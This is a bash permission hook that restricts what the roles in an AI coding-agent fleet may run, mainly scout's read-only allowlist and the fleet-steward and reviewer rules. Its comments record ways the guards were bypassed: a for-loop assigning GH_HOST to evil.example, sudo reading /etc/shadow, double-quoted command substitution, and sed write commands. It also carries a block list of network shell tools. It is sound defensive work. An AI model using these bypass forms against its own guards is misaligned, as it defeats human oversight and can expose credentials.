# behind a wrapper (env, nice, timeout and the rest of COMMAND_WRAPPERS, whose
# options and durations are skipped the way command_words skips them), or as
# the variable of a `for NAME in` header. A NAME=value word after the command
# word is an argument - `gh api x -f title=x` assigns nothing - so a regex over
# the whole command was the wrong tool and was replaced by this walk. $1 the
# newline-separated segments.
#
# The for header is matched before strip_leading_syntax runs, because that
# function consumes the whole header - it runs nothing - and the loop variable
# it assigns would never reach the walk. Round 2 found
# `for GH_HOST in evil.example; do gh issue list; done` allowed that way.
#
# export, declare, typeset, readonly and local are read as wrappers below so
# the walk describes the shell faithfully, but for scout that branch decides
# nothing: none of them is on scout's allowlist, so the segment holding one is
# denied by the allowlist whichever order the segments come in. When the gh
# segment comes first, the branch only makes this message the one shown.
GH_FOR_HEADER_RE='^([[:space:]]|\(|\{|!|(then|do|else|elif|if|while|until)[[:space:]])*for[[:space:]]+([A-Za-z_][A-Za-z0-9_]*)'
gh_command_assigns() {
  local seg tok after
  while IFS= read -r seg; do
    if [[ $seg =~ $GH_FOR_HEADER_RE ]]; then printf 'for:%s' "${BASH_REMATCH[3]}"; return 0; fi
    seg="$(strip_leading_syntax "$seg")"
    set -f
    # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
    set -- $seg
    set +f
    after=no
    for tok in "$@"; do
      if [[ $tok =~ ^([A-Za-z_][A-Za-z0-9_]*)= ]]; then printf '%s' "${BASH_REMATCH[1]}"; return 0; fi
      case "$tok" in
        -*) [ "$after" = yes ] && continue; break ;;
        [0-9]*) [ "$after" = yes ] && [[ $tok =~ ^[0-9]+(\.[0-9]+)?[smhd]?$ ]] && continue; break ;;
        export|declare|typeset|readonly|local) after=yes; continue ;;
        # read assigns from standard input, which no scan sees. Reported as
        # the command word itself, never as an argument.
        read) printf 'read'; return 0 ;;
      esac
      case "$COMMAND_WRAPPERS" in
        *" ${tok##*/} "*) after=yes; continue ;;
      esac
      break
    done
  done <<< "$1"
  printf ''
}

# A quote opening a word whose first character is -: the flag inside cannot be
# seen once the span is erased, so `"--web=true"` is refused on its shape.
# Deliberately scanned over the WHOLE command, not only the gh segment: a quote
# can hold the shell's own separators, so splitting the raw command into
# segments here would be a parse this file does not attempt. The cost is a
# false deny when another segment of a command that runs gh quotes a word
# starting with - (`grep -e "-x"`), which is the safe way to be wrong.
GH_QUOTED_FLAG_RE='(^|[[:space:]])\$?["'"'"']-'

# Removes single- and double-quoted spans so a redirection character inside a
# search pattern (grep -R '=>' src) is not mistaken for a redirection.
#
# Use this for redirection and process substitution only. Those are inert inside
# either kind of quote, so erasing both is correct for them and nothing else.
strip_quoted() {
  printf '%s' "$1" | sed -e "s/'[^']*'/''/g" -e 's/"[^"]*"/""/g'
}

# Removes single-quoted spans only, because those are the only ones that disarm
# a substitution. The shell expands $( ) and backticks inside double quotes:
#
#   echo "$(touch /tmp/proof)"   runs touch
#   echo '$(touch /tmp/proof)'   prints the text
#
# Checking the fully stripped string for "$(" therefore answered the wrong
# question, and every substitution wrapped in double quotes was waved through.
# The two checks need different strippers; they used to share one.
strip_single_quoted() {
  printf '%s' "$1" | sed -e "s/'[^']*'/''/g"
}

# sed writes files without any redirection character: `w file` and `W file`
# write, `s/x/y/w file` writes, and `e` executes a command. The script is
# almost always quoted, so the old checks never saw it - `sed -n 'w /tmp/proof'`
# looked like an ordinary `sed -n` read.
#
# Rather than parse sed, this matches a write or execute command at a position
# where sed would take one: the start of the script, or after an address, a
# semicolon or a brace. Addresses and regexes are left alone, so
# `sed -n '/warning/p'` and `sed -n '1,50p'` still pass.
# No backreference: grep here may be ugrep, which rejects them in ERE. The three
# alternatives are a w/W command after an address terminator, an `e` command,
# and a `w` flag on a substitution.
SED_WRITE_RE="(^|[[:space:];{}0-9\$/,'\"])[wW]([[:space:]]|$)|(^|[[:space:];{}'\"])e([[:space:]]|$)|s[/|#,:].*[/|#,:][[:alnum:]]*w([[:space:]]|$)"
sed_writes() {
  printf '%s' "$1" | grep -Eq "$SED_WRITE_RE"
}

# The command a segment actually runs: leading VAR=value assignments dropped,
# then the basename of the first word. Empty if the segment is only assignments.
# Wrappers the shell runs straight through: the real command is what follows.
# A closed list, because it costs no false denies - unlike treating any token
# that matches a forbidden verb as one.
# NOT sudo. Transparency is asymmetric: for a denylist role it stops a forbidden
# verb hiding behind the wrapper, but for an allowlist role it removes the
# requirement that the wrapper itself be permitted - and `sudo cat` is not the
# same act as `cat`. Listing it here let `sudo cat /etc/shadow` past scout's
# allowlist, which had refused it purely because sudo was not on the list.
# permissions.deny backstops sudo, but the per-agent layer is precisely the half
# permissions.deny cannot express, so it should not be the looser of the two.
#
# NOT `script` either, and for the same asymmetry rather than a different one.
# `script cat` does not run cat: it starts a shell and writes the typescript to
# a file called `cat`. Making it transparent would hand scout a way to create a
# file, which is exactly the sudo shape. It closes nothing in return, because
# the form that runs a command - `script -q /dev/null git commit` - has the
# typescript file between the wrapper and the command word, so the token is
# `/dev/null` either way. It stays on the open-items list instead.
#
# The five additions are scheduling wrappers, and they are transparent in the
# sense that matters: `nice cat x` is the same act as `cat x`, none of them
# writes anything of its own, and each was confirmed to actually run git.
COMMAND_WRAPPERS=" command env builtin exec nohup time xargs timeout nice stdbuf setsid ionice "

# Shell syntax that can legally sit in front of a command word, which the shell
# consumes before it decides what to run. leading_token read the first of these
# AS the command name, so `{ git commit -m x; }`, `( git commit -m x )`,
# `! git commit -m x`, `>/tmp/out git commit -m x` and the body of any if, for
# or while had a command word that no rule was looking for - which retires the
# refuter's git rule, coder's worktree guard, ui-designer's install ban and
# fleet-steward's merge ban all at once, the same four the quoting work above
# exists to protect. Every form was confirmed to actually run git.
#
# Stripped in a loop, because they stack: `then ! >/tmp/x git commit -m x` is
# one segment with three of them in front. Only ever at the FRONT of a segment,
# so nothing that is an argument is touched.
#
# What it does not reach is command substitution. `$(git commit -m x)` has no
# leading token to remove - the `$` is part of the word - so it stays open for
# every role without a substitution check of its own, which is refuter, coder
# and ui-designer. That is on the open-items list rather than papered over here.
#
# No subprocess: this runs once per segment, and the segment bound above exists
# because per-segment spawns are what reach the hook's timeout.
# The closers are here too, and not for symmetry. Splitting `{ ls -la; }` on the
# shell's `;` leaves a segment that is just `}`, and an allowlist role denied
# that segment because `}` is not a command it may run - so a brace group around
# a plain read was refused for the wrong reason. A segment made only of closing
# syntax is not a command at all, and after the strip it is empty and skipped.
# Hence the whitespace-or-end match rather than the whitespace the openers need.
LEADING_KEYWORD_RE='^(!|\{|\}|then|do|else|elif|if|while|until|fi|done|esac)([[:space:]].*)?$'
# A for-loop header is not a keyword in front of a command: `for f in a b` runs
# nothing at all, and the body arrives in the next segment behind `do`. So the
# whole header is consumed and the segment ends up empty. Before this it reached
# the allowlist roles as a command called `for`, and a loop that only greps was
# denied. What could make the word list run something - $( ), backticks, <( )
# and redirection - is refused before any role splits the command, or is its own
# segment after the split, so the header is inert by the time it gets here.
# C-style `for ((...))` is not matched and stays denied for the allowlist roles.
FOR_HEADER_RE='^for[[:space:]]+[A-Za-z_][A-Za-z0-9_]*([[:space:]]+in([[:space:]].*)?)?$'
# A redirection and its target. The target excludes parens so that `<(cmd)` and
# `>(cmd)` are left whole for the process-substitution checks to see.
LEADING_REDIRECT_RE='^[0-9]*(>>?|<)[[:space:]]*[^[:space:];|&<>()]+(.*)$'
strip_leading_syntax() {
  local s="$1"
  while :; do
    if [[ $s =~ ^[[:space:]]+(.*)$ ]]; then s="${BASH_REMATCH[1]}"; continue; fi
    if [[ $s =~ ^\((.*)$ ]]; then s="${BASH_REMATCH[1]}"; continue; fi
    if [[ $s =~ $LEADING_KEYWORD_RE ]]; then s="${BASH_REMATCH[2]}"; continue; fi
    if [[ $s =~ $FOR_HEADER_RE ]]; then s=""; break; fi
    if [[ $s =~ $LEADING_REDIRECT_RE ]]; then s="${BASH_REMATCH[2]}"; continue; fi
    break
  done
  printf '%s' "$s"
}

# The segment with leading assignments and wrapper commands removed. Both
# parsers below start from this, so they cannot disagree about which word is the
# command - and they did: leading_token stripped VAR=val to find "npm" while
# sub_verb dropped position one, which WAS the assignment, and returned "npm" as
# the verb. `NODE_ENV=production npm install react` walked past the install ban
# on that disagreement alone.
command_words() {
  local seg first next after_wrapper=no
  seg="$(strip_leading_syntax "$1")"
  while :; do
    first="$(printf '%s' "$seg" | awk '{print $1}')"
    case "$first" in
      "") break ;;
      *=*) ;;
      # A wrapper's own options belong to the wrapper, so `env -i git merge` and
      # `xargs -n1 git merge` are still the git command that follows. Only
      # consumed straight after a wrapper, so an ordinary command's options are
      # never mistaken for something to skip.
      -*)
        if [ "$after_wrapper" = yes ]; then :; else break; fi
        ;;
      # `timeout` takes a DURATION between itself and the command, so listing it
      # as a wrapper alone left the token as `5` and closed nothing. A bare
      # number with an optional s/m/h/d suffix, and only directly after a
      # wrapper, is that duration: no command is named `5` or `30s`, and
      # `nice -n 10 git merge` gets the same treatment for free. `env 7z x`
      # keeps its command word, because `7z` is not a duration.
      [0-9]*)
        if [ "$after_wrapper" = yes ] && [[ $first =~ ^[0-9]+(\.[0-9]+)?[smhd]?$ ]]; then :; else break; fi
        ;;
      *)
        case "$COMMAND_WRAPPERS" in
          *" ${first##*/} "*) after_wrapper=yes ;;
          *) break ;;
        esac
        ;;
    esac
    next="$(printf '%s' "$seg" | sed -E 's/^[^[:space:]]+[[:space:]]+//')"
    if [ "$next" = "$seg" ]; then seg=""; break; fi
    seg="$next"
  done
  printf '%s' "$seg"
}

leading_token() {
  local tok
  tok="$(printf '%s' "$(command_words "$1")" | awk '{print $1}')"
  # Unescaped before the basename, the way the shell removes quoting before it
  # resolves the name: `\git` is the command `git`, and `/bin/\git` is too.
  tok="$(unescape_words "$tok")"
  printf '%s\n' "${tok##*/}"
}

# Where a segment runs, for the two roles that care: coder's worktree guard and
# the reviewer's gate rule. A cd or pushd earlier in the same command moves every
# segment after it, so the caller sets SEG_HERE and SEG_PREV to the tool call's
# cwd, then hands each segment here in order. $1 the segment, $2 its
# leading_token. Returns 0, having moved SEG_HERE, when the segment is a cd or
# pushd, and 1 for anything else.
#
# seg_cd is a model of the shell, and the model is only trusted in the one
# shape cd_shape_ok below allows. It was wrong everywhere else (CF-90 fix round
# 1): `cd -P <dir>` skipped the option and so never moved, while the shell did;
# `true || cd <dir>`, `( cd <dir> )`, `cd <dir> | cat` and `cd <dir> &` moved
# the model and not the shell; `cd -` follows the inherited OLDPWD, which the
# command does not name; and zsh's `cd old new` rewrites PWD.
SEG_HERE=""
SEG_PREV=""
seg_cd() {
  local arg
  case "$2" in cd|pushd) ;; *) return 1 ;; esac
  arg="$(printf '%s' "$(command_words "$1")" | awk '{print $2}')"
  case "$arg" in
    ''|'~') SEG_PREV="$SEG_HERE"; SEG_HERE="$HOME" ;;
    -)      arg="$SEG_PREV"; SEG_PREV="$SEG_HERE"; SEG_HERE="$arg" ;;
    -*)     ;;
    *)      SEG_PREV="$SEG_HERE"; SEG_HERE="$(lex_abs "$arg" "$SEG_HERE")" ;;
  esac
  return 0
}

# Whether a guarded segment - a reviewer's gate, a coder's writing git verb -
# runs where seg_cd says it does. Fail closed: a command with no cd at all runs
# in the tool call's cwd; a command with a cd must open with exactly
# `cd <path> &&`, one cd, no option, a path starting with /, ./ or ../ (or . or
# ..) so CDPATH cannot redirect it, and only && between the cd and the guarded
# segment, so the segment runs only if the cd succeeded and nothing between
# them could have moved or forked the shell. Anything else - a second cd,
# pushd or popd, an option, a subshell, a pipe, ||, & or ; before the segment -
# is refused rather than modelled.
#
# $1 the command with quoted spans erased, before it was split; $2 how many of
# its segments are cd, pushd or popd; $3 the guarded segment's 1-based index
# among the split segments.
CD_PATH_CHARS='[A-Za-z0-9_.@+,:=/-]'
CD_LEAD_RE="^[[:space:]]*cd[[:space:]]+(\\.|\\.\\.|\\./${CD_PATH_CHARS}*|\\.\\./${CD_PATH_CHARS}*|/${CD_PATH_CHARS}*)[[:space:]]*&&(.*)\$"
SHELL_CD_WORDS=" cd pushd popd "
CD_SHAPE_RULE='A command that runs it may change directory only as its first step, written `cd <path> && ... && <command>`: one cd, no option, a path starting with /, ./ or ../, and only && between the cd and the command. Anything else is refused rather than guessed at, because the shell may not end up where the command seems to say.'
cd_shape_ok() {
  local rest chain marks stop=$'|&;\n()' ctl=$'\003'
  [ "$2" -eq 0 ] && return 0
  [ "$2" -eq 1 ] || return 1
  [[ $1 =~ $CD_LEAD_RE ]] || return 1
  rest="${BASH_REMATCH[2]}"
  rest="${rest//&&/$ctl}"
  chain="${rest%%[$stop]*}"
  marks="${chain//[!$ctl]/}"
  # The cd is segment 1, and the chain holds one more segment than it has &&s.
  [ "$3" -le $(( ${#marks} + 2 )) ]
}

enforce_scout() {
  if is_write_tool "$tool_name"; then
    deny "scout invariant: \"Never edit, write or create a file, and leave the working tree exactly as you found it.\" scout answers in paths, line numbers and quoted excerpts only. Hand the change to coder."
  fi
  [ "$tool_name" = "Bash" ] || return 0
  [ -n "$command_str" ] || return 0

  local scan subst_scan seg first next tok verb why
  scan="$(strip_quoted "$command_str")"
  # Discarding output is not a state change, so let 2>/dev/null through before
  # looking for redirections.
  scan="$(printf '%s' "$scan" | sed -E 's/[0-9]?>>?[[:space:]]*\/dev\/null//g')"
  # Substitution survives double quotes, so it gets its own, weaker strip.
  subst_scan="$(strip_single_quoted "$command_str")"

  # sed can write with no redirection character at all, and its script is
  # normally quoted, so this has to look at the command as written.
  if printf '%s' "$scan" | grep -Eq '(^|[[:space:];|&])sed([[:space:]]|$)' && sed_writes "$command_str"; then
    deny "scout invariant: \"leave the working tree exactly as you found it.\" That sed script contains a w, W or e command, which writes a file or runs a program - a quoted script is still a script. Use sed -n with p to print, and hand any change to coder."
  fi

  case "$subst_scan" in
    *'$('*|*'`'*)
      deny "scout invariant: no command substitution. The command contains \$( or a backtick, which can hide a write behind a read. Note that double quotes do not disarm it - \"\$(...)\" still runs. Run the inner command on its own." ;;
  esac

  case "$scan" in
    *'>'*)
      deny "scout invariant: \"no redirection into a file\". scout leaves the working tree exactly as it found it, so > and >> are not available. Read the file and quote it instead." ;;
    *'<('*|*'>('*)
      deny "scout invariant: no process substitution. Run the commands separately." ;;
  esac

  # Split on the shell operators that start a new command.
  scan="$(bound_segments "$(printf '%s' "$scan" | sed -E 's/(\|\||&&|;|\||&)/\n/g')")"
  while IFS= read -r seg; do
    seg="$(printf '%s' "$seg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')"
    [ -n "$seg" ] || continue
    # Strip leading VAR=value assignments, keeping both the command token
    # and the remaining segment - the sed and git checks below inspect the
    # arguments in $first. leading_token() carries the progress check the
    # old inline loop lacked: a segment that is only an assignment
    # (FOO=bar with nothing after it) made the sed a no-op and spun until
    # the hook timeout.
    tok="$(leading_token "$seg")"
    [ -n "$tok" ] || continue
    first="$seg"
    while :; do
      case "$(printf '%s' "$first" | awk '{print $1}')" in
        *=*) ;;
        *) break ;;
      esac
      next="$(printf '%s' "$first" | sed -E 's/^[^[:space:]]+[[:space:]]+//')"
      [ "$next" = "$first" ] && { first=""; break; }
      first="$next"
    done

    case "$SCOUT_ALLOWED_CMDS" in
      *" $tok "*) ;;
      *) deny "scout invariant: \"run only commands that read - ls, cat, head, tail, sed -n, wc, file, rg, grep, find, read-only git log, git show, git blame, git diff, git ls-files, and read-only gh.\" \"$tok\" is not on that list. If the answer needs a state change, hand it to an agent that is allowed to make one." ;;
    esac

    case "$tok" in
      sed)
        case " $first " in
          *" -i"*|*" --in-place"*)
            deny "scout invariant: sed -i edits the file in place. scout leaves the working tree exactly as it found it." ;;
        esac
        case " $first " in
          *" -n"*) ;;
          *) deny "scout invariant: the allowlist is \"sed -n\", not sed. Add -n and an explicit p, so sed only prints." ;;
        esac
        ;;
      find)
        case " $first " in
          *" -exec"*|*" -execdir"*|*" -ok"*|*" -okdir"*|*" -delete"*|*" -fprintf"*|*" -fls"*|*" -fprint"*)
            deny "scout invariant: find -exec, -delete and the -f* actions run or write things. Use find to locate files and read them separately." ;;
        esac
        ;;
      git)
        verb="$(sub_verb "${first}")"
        case "$SCOUT_ALLOWED_GIT" in
          *" $verb "*) ;;
          *) deny "scout invariant: read-only git only - log, show, blame, diff, ls-files. \"git $verb\" is not one of them." ;;
        esac
        ;;
      gh)
        why="$(gh_command_assigns "$scan")"
        case "$why" in
          '') ;;
          for:*) deny "scout invariant: read-only gh only, and a command that runs gh may assign no variable. It has a for loop, whose header assigns ${why#for:} on every pass. Run gh once per value, written out." ;;
          read) deny "scout invariant: read-only gh only. This command runs read, which assigns a variable from standard input where no check can see it, and a command that runs gh may assign none. Run gh on its own." ;;
          *) deny "scout invariant: read-only gh only, and a command that runs gh may assign no variable. This one assigns $why, and a variable can point gh at another config, host or proxy - GH_CONFIG_DIR alone makes --web run whatever browser that config names. Run gh with none." ;;
        esac
        if gh_via_xargs "$first"; then
          deny "scout invariant: read-only gh only, and never through xargs, which hands gh words from standard input that no check of the command can see. Run gh with every word written out."
        fi
        verb="$(gh_pair "$first")"
        case "$verb" in
          option:*)
            deny "scout invariant: read-only gh only. \"${verb#option:}\" stands before the subcommand, and gh may read the next word as its value, which would change which command runs. Only -R or --repo may come before the subcommand; put any other option after it." ;;
          auth|auth\ *)
            deny "scout invariant: read-only gh only, and \"gh auth\" is denied in every form - \"gh auth token\" prints the human's GitHub credential. Nothing scout does needs it." ;;
        esac
        case "$SCOUT_ALLOWED_GH" in
          *",$verb,"*) ;;
          *) deny "scout invariant: read-only gh only - issue list/view/status, pr list/view/diff/checks/status, run list/view, repo view, release list/view, label list, search issues/prs/repos/code/commits, and api as a GET. \"gh $verb\" is not one of them. If the answer needs a write to GitHub, hand it back to the agent that asked." ;;
        esac
        why="$(gh_words_denial "$first" "$verb")"
        case "$why" in
          expands:*)
            deny "scout invariant: read-only gh only. \"${why#expands:}\" holds \$, {, *, ?, [ or a backtick, which the shell expands into words gh reads and this check does not - \$'-f' is -f. Write every gh word out plainly." ;;
          quoted:*)
            deny "scout invariant: read-only gh only. \"${why#quoted:}\" is an option with a quoted part, and a quoted option cannot be read here. Write gh's options unquoted." ;;
          web:*)
            deny "scout invariant: read-only gh only, and no --web or -w: \"${why#web:}\" opens a browser, which runs whatever program gh's config or environment names. Read the text in the terminal instead." ;;
        esac
        if printf '%s' "$command_str" | grep -Eq "$GH_QUOTED_FLAG_RE"; then
          deny "scout invariant: read-only gh only. This command has a quoted option - a quote opening a word that starts with - - and what a quoted option says cannot be read here. Write gh's options unquoted."
        fi
        if [ "$verb" = api ]; then
          why="$(gh_api_denial "$first")"
          [ -z "$why" ] || deny "scout invariant: read-only gh only, so gh api is a plain GET or nothing - $why. It takes one endpoint, which may end in a query string, and only --paginate, --slurp, -i/--include, -q/--jq, -t/--template, -H/--header with an Accept header, and -X/--method GET, each written unquoted."
        fi
        ;;
    esac
  done <<< "$scan"
  return 0
}

# ---------------------------------------------------------------- fleet-steward
# Invariants: "Never touch anything outside the `coder-fleet` working copy"
# and "Never run a git command that rewrites shared history: no force-push, no
# reset, no rebase onto a shared branch", plus "Never merge."
steward_repo_root() {
  if [ -n "${CODER_FLEET_REPO:-}" ]; then
    printf '%s\n' "${CODER_FLEET_REPO%/}"
    return 0
  fi
  # Run from a working copy or the marketplace clone, the plugin sits at
  # <repo>/claude/coder-fleet, two levels below
  # <repo>/.claude-plugin/marketplace.json. From the plugin cache the plugin
  # directory is named for its version, so this finds nothing and the caller
  # falls back to its weaker check.
  local hook_dir plugin_root harness_dir repo
  hook_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
  plugin_root="$(dirname "$hook_dir")"
  harness_dir="$(dirname "$plugin_root")"
  repo="$(dirname "$harness_dir")"
  if [ "$(basename "$plugin_root")" = "coder-fleet" ] && [ "$(basename "$harness_dir")" = "claude" ] \
    && [ -f "$repo/.claude-plugin/marketplace.json" ]; then
    printf '%s\n' "$repo"
    return 0
  fi
  return 1
}

enforce_fleet_steward() {
  if is_write_tool "$tool_name"; then
    if [ -z "$file_path" ]; then
      log "fleet-steward called $tool_name with no path in tool_input; allowing"
      return 0
    fi
    local abs root; abs="$(lex_abs "$file_path" "$cwd")"
    if root="$(steward_repo_root)"; then
      case "$abs" in
        "$root"/*) return 0 ;;
      esac
      deny "fleet-steward invariant: \"Never touch anything outside the coder-fleet working copy.\" $tool_name targeted $abs, which is outside $root. The steward files and proposes; it does not edit other repositories."
    else
      # No repo root could be resolved, so fall back to the weaker check and say
      # so, rather than pretending this is airtight.
      case "$abs" in
        */coder-fleet/*) return 0 ;;
      esac
      deny "fleet-steward invariant: \"Never touch anything outside the coder-fleet working copy.\" $tool_name targeted $abs, which is not under a coder-fleet directory. Set CODER_FLEET_REPO in ~/.config/coder-fleet/board.env if the working copy lives somewhere this check cannot see."
    fi
  fi

  [ "$tool_name" = "Bash" ] || return 0
  [ -n "$command_str" ] || return 0

  local scan seg verb root target abs
  scan="$(strip_quoted "$command_str")"
  scan="$(printf '%s' "$scan" | sed -E 's/[0-9]?>>?[[:space:]]*\/dev\/null//g')"

  # The steward genuinely needs a shell - it runs the evals and prepares a
  # branch - so its Bash cannot be an allowlist of readers the way scout's is.
  # What it must not do is write outside its own working copy, and the branch
  # below only ever inspected git verbs, so every ordinary shell write sailed
  # past: `printf changed > /tmp/outside-repo.txt` was accepted in full.
  #
  # Redirection targets are therefore resolved and checked. This is a real
  # narrowing, not a complete boundary: a program the steward runs can still
  # write wherever the process can, and no shell-level check can see that. That
  # limit is stated in fleet-steward.md rather than papered over.
  if root="$(steward_repo_root)"; then :; else root=""; fi
  while IFS= read -r target; do
    [ -n "$target" ] || continue
    target="$(printf '%s' "$target" | sed -E 's/^[0-9]*>>?[[:space:]]*//')"
    [ -n "$target" ] || continue
    case "$target" in
      '&'*) continue ;;   # 2>&1 and friends duplicate a descriptor, not a file
    esac
    abs="$(lex_abs "$target" "$cwd")"
    # The steward needs somewhere to stage a diff, so its own temporary
    # directory is allowed - but only that one. Bare /tmp is shared with every
    # other user and process on the box, which is the sort of "outside the
    # working copy" the invariant is actually about.
    case "$abs" in
      "${TMPDIR:-/nonexistent-tmpdir}"/*|/dev/*) continue ;;
    esac
    if [ -n "$root" ]; then
      case "$abs" in
        "$root"/*) continue ;;
      esac
      deny "fleet-steward invariant: \"Never touch anything outside the coder-fleet working copy.\" This command redirects into $abs, which is outside $root. Write inside the working copy, or into a temporary directory."
    else
      case "$abs" in
        */coder-fleet/*) continue ;;
      esac
      deny "fleet-steward invariant: \"Never touch anything outside the coder-fleet working copy.\" This command redirects into $abs, which is not under a coder-fleet directory. Set CODER_FLEET_REPO in ~/.config/coder-fleet/board.env if the working copy lives somewhere this check cannot see."
    fi
  done <<< "$(printf '%s' "$scan" | grep -Eo '[0-9]?>>?[[:space:]]*[^[:space:];|&]+' || true)"

  case "$(strip_single_quoted "$command_str")" in
    *'$('*|*'`'*)
      # Not a blanket ban: the steward writes shell. But a substitution hides
      # its own redirections from the check above, so it has to be spelled out.
      deny "fleet-steward invariant: \"Never touch anything outside the coder-fleet working copy.\" A command substitution hides where its inner command writes, so this check cannot confirm the write stays inside the working copy. Run the inner command on its own line." ;;
  esac

  scan="$(bound_segments "$(printf '%s' "$scan" | sed -E 's/(\|\||&&|;|\||&)/\n/g')")"
  while IFS= read -r seg; do
    seg="$(printf '%s' "$seg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')"
    # leading_token, not the raw first word: an assignment or a wrapper in front
    # of git is transparent to the shell and has to be transparent here.
    case "$(leading_token "$seg")" in
      git) ;;
      *) continue ;;
    esac
    verb="$(sub_verb "${seg}")"
    case "$verb" in
      merge|rebase|reset|filter-branch|filter-repo)
        deny "fleet-steward invariant: \"Never merge\" and \"never run a git command that rewrites shared history: no force-push, no reset, no rebase onto a shared branch.\" \"git $verb\" is one of those. File it and propose it; the human decides on the pull request." ;;
      push)
        case " $seg " in
          *" --force"*|*" -f "*|*" --force-with-lease"*|*" --delete "*|*" --mirror"*)
            deny "fleet-steward invariant: no force-push and no history rewrite. Push the branch normally and open a pull request." ;;
        esac
        case " $seg " in
          *" main"*|*" master"*|*" refs/heads/main"*|*" refs/heads/master"*)
            deny "fleet-steward invariant: \"no push to a default branch\". Push the migration branch and open a pull request instead." ;;
        esac
        ;;
    esac
  done <<< "$scan"
  return 0
}

# -------------------------------------------------------------------- reviewer
# Invariants: "Never edit, write or create a file. Not a fix, not a test, not a
# note.", "Never run a git command that writes: no commit, push, force-push,
# checkout, stash, reset or rebase. Read-only git only." and "Run the project's
# declared gates read-only, from the top of the review worktree, and nothing
# else that executes code." (CF-90; the last replaced "Never run tests, builds
# or installs").
#
# Both lists are allowlists now. The command list used to be a denylist of build
# tools, and a denylist of things that run code can never be finished: it named
# forty package managers and test runners and still let `touch` create a file,
# because `touch` is not a build tool and nobody had thought of it. The reviewer
# needs to read a tree and its history, which is a small, closed set of commands,
# so state that set instead of trying to enumerate its complement.
#
# It is scout's list plus the read-only git verbs a review actually reaches for -
# a reviewer looks at status and rev-parse where a scout does not - and plus
# awk/sort/uniq/comm/diff/cut/tr/column, which shape output without touching it.
REVIEWER_ALLOWED_GIT=" log show blame diff ls-files status shortlog describe rev-parse rev-list cat-file grep whatchanged "
REVIEWER_ALLOWED_CMDS=" ls cat head tail sed wc file rg grep find git cd pwd echo true read awk sort uniq comm diff cut tr column basename dirname stat od xxd "

# ------------------------------------------------------------ reviewer gates
# The one thing a reviewer may execute beyond the reads above is the project's
# own gate list, and only as written in it (CF-90, GitHub #45). The invariant
# the reviewer holds is "never change the diff under review or its
# dependencies", and a typecheck or a test run that writes nothing into the
# tree does not change it - but a package manager, an install, a snapshot
# update, a --fix, a watcher, an emitting build and a network call all can, so
# those are refused whatever the list says.
#
# An allowlist, not a denylist, for the reason CF-84 learned on scout's gh rule:
# a denylist over a command's words loses to the shell, which builds words a
# reader never sees. So a gate segment must match a declared gate word for
# word, after the same normalisation every other rule here reads through -
# strip_inert_quotes and the interpreter recovery at the top, strip_quoted's
# erasure, strip_leading_syntax, unescape_words - and must survive the words
# scout's gh rule refuses: word_expansion_denial ($ { * [ ? and backticks, and a
# quoted option), GH_QUOTED_FLAG_RE over the whole command, gh_command_assigns
# (no variable assigned anywhere in the command, a for header or read
# included), and no wrapper from COMMAND_WRAPPERS in front of it. Installs are
# found with ui-designer's install_verb.
#
# Where the list is declared. A fenced block with the info string `gates` in
# the project's AGENTS.md, one `name: command` per line:
#
#   ```gates
#   typecheck: ./node_modules/.bin/tsc --noEmit
#   test: ./node_modules/.bin/vitest run
#   ```
#
# AGENTS.md rather than .claude/settings.json because every harness the fleet
# ports to reads AGENTS.md and only Claude Code reads settings.json, and because
# the coder reads the same file on every turn, so one list tells the coder what
# to run before its handoff and the reviewer what it may run after. The file is
# read from the MAIN checkout, found through the worktree's git common dir, and
# never from the worktree under review: a diff that edits its own AGENTS.md
# must not widen what its reviewer may execute. The gate named `test` is the
# test runner, the only gate that may be run with one relative path, one
# test-name filter or both after it.
#
# Where a gate may run: the top of a linked worktree, and nowhere else. The main
# checkout is where the board hooks commit, and a run there is a run against
# whatever branch it happens to have out.
REVIEWER_PACKAGE_MANAGERS=" npm npx pnpm pnpx yarn yarnpkg bun bunx corepack deno pip pip3 pipx poetry uv uvx gem bundle composer cargo go brew "
REVIEWER_NETWORK_TOOLS=" curl wget nc ncat netcat socat ssh scp sftp rsync ftp tftp telnet http https xh aria2c "
REVIEWER_GATE_INVARIANT="\"Run the project's declared gates read-only, from the top of the review worktree, and nothing else that executes code.\""
# No @ or + first: `pytest @args.txt` reads its flags from a file.
GATE_PATH_RE='^[A-Za-z0-9_.][A-Za-z0-9_.@+/-]*$'
GATE_NAME_RE='^[A-Za-z0-9_][A-Za-z0-9_.:@+,/=-]*$'

# The gates declared in $1/AGENTS.md, one "name<TAB>command" line each, from
# the first ```gates block only.
declared_gates() {
  [ -f "$1/AGENTS.md" ] || return 0
  awk '
    /^```gates[[:space:]]*$/ { on = 1; next }
    on && /^```[[:space:]]*$/ { exit }
    on {
      line = $0; sub(/\r$/, "", line)
      if (match(line, /^[A-Za-z0-9_-]+:[[:space:]]+/)) {
        name = substr(line, 1, index(line, ":") - 1)
        cmd = substr(line, RLENGTH + 1); sub(/[[:space:]]+$/, "", cmd)
        if (cmd != "") print name "\t" cmd
      }
    }' "$1/AGENTS.md"
}

# Which checkout $1 is, into GATE_KIND and GATE_ROOT (the main checkout):
# worktree (the top of a linked worktree), sub (inside one, below its top),
# main (a main checkout), layout (a git layout this cannot map to a main
# checkout) or notrepo. The git dir and the common dir differ only in a linked
# worktree, which is a sturdier test than looking for "/worktrees/" in a path a
# main checkout could also contain.
#
# The main checkout is the common dir's parent only when the common dir is a
# `.git` directory that is not bare. A --separate-git-dir checkout keeps its
# git dir elsewhere, and a bare repository with worktrees has no checkout at
# all; in both the parent is some unrelated directory, and reading an AGENTS.md
# there would take a gate list from a file nobody reviewed. So both are
# `layout`, and the caller fails closed.
#
# Cached per directory in globals, not printed, because a $( ) subshell would
# throw the cache away and a command with sixteen gate segments paid for
# sixteen git calls. GATE_GATES caches the list read from GATE_ROOT the same
# way (CF-90 fix round 1).
GATE_CACHE_DIR=""
GATE_KIND=""
GATE_ROOT=""
GATE_GATES=""
gate_dir_state() {
  local out gitdir="" common="" top="" phys bare
  [ "$1" = "$GATE_CACHE_DIR" ] && [ -n "$GATE_KIND" ] && return 0
  GATE_CACHE_DIR="$1"; GATE_KIND=notrepo; GATE_ROOT=""; GATE_GATES=""
  out="$(git -C "$1" rev-parse --path-format=absolute --git-dir --git-common-dir --show-toplevel 2>/dev/null)" || out=""
  # read fails at end of input, and under set -e with this file's ERR trap a
  # failed read would allow the call - so an empty answer must not fail here.
